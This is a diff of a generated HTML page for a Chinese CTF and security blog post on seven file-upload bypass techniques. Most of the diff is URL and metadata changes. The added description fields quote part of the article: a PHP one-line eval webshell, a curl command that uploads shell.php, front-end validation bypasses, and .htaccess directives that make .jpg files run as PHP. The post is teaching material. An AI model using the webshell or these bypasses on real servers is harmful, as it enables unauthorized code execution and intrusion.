@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto" data-theme="auto">
 
-<head><script src="/san-blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=san-blog/livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
+<meta name="robots" content="index, follow">
 <title>文件上传绕过技法全解：从无验证到双写后缀的七种攻击面 | 东阳的安全笔记</title>
 <meta name="keywords" content="CTF, Web安全, 文件上传, 绕过, Upload-Labs">
 <meta name="description" content="一、前言
@@ -44,16 +44,16 @@ Chrome DevTools → Settings → Debugger → Disable JavaScript。
 方法二：Burp 抓包修改
 先选择合法的 .jpg 文件通过前端校验，Burp 拦截后将文件名改为 shell.php。">
 <meta name="author" content="东阳">
-<link rel="canonical" href="http://localhost:1313/san-blog/posts/file-upload-bypass-techniques/">
+<link rel="canonical" href="https://Samantha09.github.io/san-blog/posts/file-upload-bypass-techniques/">
 <link crossorigin="anonymous" href="/san-blog/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/san-blog/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/san-blog/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/san-blog/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/san-blog/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/san-blog/safari-pinned-tab.svg">
+<link rel="icon" href="https://Samantha09.github.io/san-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://Samantha09.github.io/san-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://Samantha09.github.io/san-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://Samantha09.github.io/san-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://Samantha09.github.io/san-blog/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/san-blog/posts/file-upload-bypass-techniques/">
+<link rel="alternate" hreflang="en" href="https://Samantha09.github.io/san-blog/posts/file-upload-bypass-techniques/">
 <noscript>
     <style>
         #theme-toggle,
@@ -99,13 +99,103 @@ Chrome DevTools → Settings → Debugger → Disable JavaScript。
         document.querySelector("html").dataset.theme = 'light';
     }
 
+</script><meta property="og:url" content="https://Samantha09.github.io/san-blog/posts/file-upload-bypass-techniques/">
+  <meta property="og:site_name" content="东阳的安全笔记">
+  <meta property="og:title" content="文件上传绕过技法全解：从无验证到双写后缀的七种攻击面">
+  <meta property="og:description" content="一、前言 文件上传漏洞是 Web 安全中最常见的高危漏洞之一。实际环境中，服务端往往不会「完全不设防」，而是部署了多层校验。本题图梳理了文件上传从「无验证」到「双写后缀」的完整攻击链路，本文将逐一拆解图中高亮的 七种绕过技法，配合真实代码和 Payload，形成可落地的利用手册。
+二、无验证 2.1 漏洞特征 服务端对用户上传的文件不做任何校验，直接保存到可访问目录。
+$target = &#34;upload/&#34; . $_FILES[&#34;file&#34;][&#34;name&#34;]; move_uploaded_file($_FILES[&#34;file&#34;][&#34;tmp_name&#34;], $target); 2.2 利用方式 直接上传 PHP 一句话木马即可：
+&lt;?php eval($_POST[&#39;cmd&#39;]); ?&gt; 访问 http://target/upload/shell.php，蚁剑或 curl 直接连接。
+2.3 为什么还存在 常见于：
+后台管理系统的「临时上传」功能 内网测试环境未清理的接口 前后端分离架构中，前端直传 OSS 但回显了内网地址 三、前端验证绕过 3.1 漏洞特征 校验逻辑只写在浏览器端 JavaScript 中，后端 PHP 未做任何校验：
+function checkFile() { var allow_ext = &#34;.jpg|.png|.gif&#34;; var ext = file.substring(file.lastIndexOf(&#34;.&#34;)); if (allow_ext.indexOf(ext &#43; &#34;|&#34;) == -1) { alert(&#34;该文件不允许上传&#34;); return false; } } 3.2 绕过方式 方法一：禁用浏览器 JavaScript
+Chrome DevTools → Settings → Debugger → Disable JavaScript。
+方法二：Burp 抓包修改
+先选择合法的 .jpg 文件通过前端校验，Burp 拦截后将文件名改为 shell.php。">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-06-05T00:00:00+08:00">
+    <meta property="article:modified_time" content="2026-06-05T00:00:00+08:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Web安全">
+    <meta property="article:tag" content="文件上传">
+    <meta property="article:tag" content="绕过">
+    <meta property="article:tag" content="Upload-Labs">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="文件上传绕过技法全解：从无验证到双写后缀的七种攻击面">
+  <meta name="twitter:description" content="一、前言 文件上传漏洞是 Web 安全中最常见的高危漏洞之一。实际环境中，服务端往往不会「完全不设防」，而是部署了多层校验。本题图梳理了文件上传从「无验证」到「双写后缀」的完整攻击链路，本文将逐一拆解图中高亮的 七种绕过技法，配合真实代码和 Payload，形成可落地的利用手册。
+二、无验证 2.1 漏洞特征 服务端对用户上传的文件不做任何校验，直接保存到可访问目录。
+$target = &#34;upload/&#34; . $_FILES[&#34;file&#34;][&#34;name&#34;]; move_uploaded_file($_FILES[&#34;file&#34;][&#34;tmp_name&#34;], $target); 2.2 利用方式 直接上传 PHP 一句话木马即可：
+&lt;?php eval($_POST[&#39;cmd&#39;]); ?&gt; 访问 http://target/upload/shell.php，蚁剑或 curl 直接连接。
+2.3 为什么还存在 常见于：
+后台管理系统的「临时上传」功能 内网测试环境未清理的接口 前后端分离架构中，前端直传 OSS 但回显了内网地址 三、前端验证绕过 3.1 漏洞特征 校验逻辑只写在浏览器端 JavaScript 中，后端 PHP 未做任何校验：
+function checkFile() { var allow_ext = &#34;.jpg|.png|.gif&#34;; var ext = file.substring(file.lastIndexOf(&#34;.&#34;)); if (allow_ext.indexOf(ext &#43; &#34;|&#34;) == -1) { alert(&#34;该文件不允许上传&#34;); return false; } } 3.2 绕过方式 方法一：禁用浏览器 JavaScript
+Chrome DevTools → Settings → Debugger → Disable JavaScript。
+方法二：Burp 抓包修改
+先选择合法的 .jpg 文件通过前端校验，Burp 拦截后将文件名改为 shell.php。">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://Samantha09.github.io/san-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "文件上传绕过技法全解：从无验证到双写后缀的七种攻击面",
+      "item": "https://Samantha09.github.io/san-blog/posts/file-upload-bypass-techniques/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "文件上传绕过技法全解：从无验证到双写后缀的七种攻击面",
+  "name": "文件上传绕过技法全解：从无验证到双写后缀的七种攻击面",
+  "description": "一、前言 文件上传漏洞是 Web 安全中最常见的高危漏洞之一。实际环境中，服务端往往不会「完全不设防」，而是部署了多层校验。本题图梳理了文件上传从「无验证」到「双写后缀」的完整攻击链路，本文将逐一拆解图中高亮的 七种绕过技法，配合真实代码和 Payload，形成可落地的利用手册。\n二、无验证 2.1 漏洞特征 服务端对用户上传的文件不做任何校验，直接保存到可访问目录。\n$target = \u0026#34;upload/\u0026#34; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]; move_uploaded_file($_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;], $target); 2.2 利用方式 直接上传 PHP 一句话木马即可：\n\u0026lt;?php eval($_POST[\u0026#39;cmd\u0026#39;]); ?\u0026gt; 访问 http://target/upload/shell.php，蚁剑或 curl 直接连接。\n2.3 为什么还存在 常见于：\n后台管理系统的「临时上传」功能 内网测试环境未清理的接口 前后端分离架构中，前端直传 OSS 但回显了内网地址 三、前端验证绕过 3.1 漏洞特征 校验逻辑只写在浏览器端 JavaScript 中，后端 PHP 未做任何校验：\nfunction checkFile() { var allow_ext = \u0026#34;.jpg|.png|.gif\u0026#34;; var ext = file.substring(file.lastIndexOf(\u0026#34;.\u0026#34;)); if (allow_ext.indexOf(ext + \u0026#34;|\u0026#34;) == -1) { alert(\u0026#34;该文件不允许上传\u0026#34;); return false; } } 3.2 绕过方式 方法一：禁用浏览器 JavaScript\nChrome DevTools → Settings → Debugger → Disable JavaScript。\n方法二：Burp 抓包修改\n先选择合法的 .jpg 文件通过前端校验，Burp 拦截后将文件名改为 shell.php。\n",
+  "keywords": [
+    "CTF", "Web安全", "文件上传", "绕过", "Upload-Labs"
+  ],
+  "articleBody": "一、前言 文件上传漏洞是 Web 安全中最常见的高危漏洞之一。实际环境中，服务端往往不会「完全不设防」，而是部署了多层校验。本题图梳理了文件上传从「无验证」到「双写后缀」的完整攻击链路，本文将逐一拆解图中高亮的 七种绕过技法，配合真实代码和 Payload，形成可落地的利用手册。\n二、无验证 2.1 漏洞特征 服务端对用户上传的文件不做任何校验，直接保存到可访问目录。\n$target = \"upload/\" . $_FILES[\"file\"][\"name\"]; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $target); 2.2 利用方式 直接上传 PHP 一句话木马即可：\n\u003c?php eval($_POST['cmd']); ?\u003e 访问 http://target/upload/shell.php，蚁剑或 curl 直接连接。\n2.3 为什么还存在 常见于：\n后台管理系统的「临时上传」功能 内网测试环境未清理的接口 前后端分离架构中，前端直传 OSS 但回显了内网地址 三、前端验证绕过 3.1 漏洞特征 校验逻辑只写在浏览器端 JavaScript 中，后端 PHP 未做任何校验：\nfunction checkFile() { var allow_ext = \".jpg|.png|.gif\"; var ext = file.substring(file.lastIndexOf(\".\")); if (allow_ext.indexOf(ext + \"|\") == -1) { alert(\"该文件不允许上传\"); return false; } } 3.2 绕过方式 方法一：禁用浏览器 JavaScript\nChrome DevTools → Settings → Debugger → Disable JavaScript。\n方法二：Burp 抓包修改\n先选择合法的 .jpg 文件通过前端校验，Burp 拦截后将文件名改为 shell.php。\n方法三：curl 直接发包\n完全不经过浏览器，绕过一切前端校验：\ncurl -X POST \\ -F \"upload_file=@shell.php\" \\ -F \"submit=上传\" \\ \"http://target/upload.php\" 3.3 核心认知 前端校验只能提升用户体验，绝对不可作为安全防线。所有安全校验必须在服务端完成。\n四、.htaccess 解析绕过 4.1 漏洞特征 服务端检查后缀名，禁止上传 .php，但允许上传 .htaccess，且上传目录在 Apache 下运行。\n4.2 利用原理 Apache 的 .htaccess 文件可以覆盖当前目录的配置。通过上传自定义的 .htaccess，可以让 Apache 把任意后缀当作 PHP 执行：\n# 将 .jpg 文件解析为 PHP AddType application/x-httpd-php .jpg # 或者更激进：所有文件都按 PHP 解析 SetHandler application/x-httpd-php 4.3 完整攻击链 上传 .htaccess： ",
+  "wordCount" : "671",
+  "inLanguage": "en",
+  "datePublished": "2026-06-05T00:00:00+08:00",
+  "dateModified": "2026-06-05T00:00:00+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "东阳"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://Samantha09.github.io/san-blog/posts/file-upload-bypass-techniques/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "东阳的安全笔记",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://Samantha09.github.io/san-blog/favicon.ico"
+    }
+  }
+}
 </script>
 </head>
 <body id="top">
     <header class="header">
     <nav class="header-nav">
         <div class="logo">
-            <a href="http://localhost:1313/san-blog/" accesskey="h" title="东阳的安全笔记 (Alt + H)">东阳的安全笔记</a>
+            <a href="https://Samantha09.github.io/san-blog/" accesskey="h" title="东阳的安全笔记 (Alt + H)">东阳的安全笔记</a>
             <div class="logo-switches">
                 <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                     <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
@@ -131,27 +221,27 @@ Chrome DevTools → Settings → Debugger → Disable JavaScript。
         </div>
         <ul id="menu" class="menu">
             <li>
-                <a href="http://localhost:1313/san-blog/" title="首页">
+                <a href="https://Samantha09.github.io/san-blog/" title="首页">
                     <span>首页</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/san-blog/posts/" title="文章">
+                <a href="https://Samantha09.github.io/san-blog/posts/" title="文章">
                     <span>文章</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/san-blog/tags/" title="标签">
+                <a href="https://Samantha09.github.io/san-blog/tags/" title="标签">
                     <span>标签</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/san-blog/categories/" title="分类">
+                <a href="https://Samantha09.github.io/san-blog/categories/" title="分类">
                     <span>分类</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/san-blog/archives/" title="归档">
+                <a href="https://Samantha09.github.io/san-blog/archives/" title="归档">
                     <span>归档</span>
                 </a>
             </li>
@@ -535,18 +625,18 @@ Chrome DevTools → Settings → Debugger → Disable JavaScript。
 
   <footer class="post-footer">
     <ul class="post-tags">
-      <li><a href="http://localhost:1313/san-blog/tags/ctf/">CTF</a></li>
-      <li><a href="http://localhost:1313/san-blog/tags/web%E5%AE%89%E5%85%A8/">Web安全</a></li>
-      <li><a href="http://localhost:1313/san-blog/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a></li>
-      <li><a href="http://localhost:1313/san-blog/tags/%E7%BB%95%E8%BF%87/">绕过</a></li>
-      <li><a href="http://localhost:1313/san-blog/tags/upload-labs/">Upload-Labs</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/ctf/">CTF</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/web%E5%AE%89%E5%85%A8/">Web安全</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/%E7%BB%95%E8%BF%87/">绕过</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/upload-labs/">Upload-Labs</a></li>
     </ul>
 <nav class="paginav">
-  <a class="prev" href="http://localhost:1313/san-blog/posts/php-input-file-inclusion/">
+  <a class="prev" href="https://Samantha09.github.io/san-blog/posts/php-input-file-inclusion/">
     <span class="title">« Prev</span>
     <span>php://input 文件包含漏洞利用：从原理到实战</span>
   </a>
-  <a class="next" href="http://localhost:1313/san-blog/posts/file-upload-vulnerability/">
+  <a class="next" href="https://Samantha09.github.io/san-blog/posts/file-upload-vulnerability/">
     <span class="title">Next »</span>
     <span>文件上传漏洞实战：从无验证到 Getshell 的完整流程</span>
   </a>
@@ -557,7 +647,7 @@ Chrome DevTools → Settings → Debugger → Disable JavaScript。
     </main>
     
 <footer class="footer">
-        <span>&copy; 2026 <a href="http://localhost:1313/san-blog/">东阳的安全笔记</a></span> · 
+        <span>&copy; 2026 <a href="https://Samantha09.github.io/san-blog/">东阳的安全笔记</a></span> · 
 
     
     
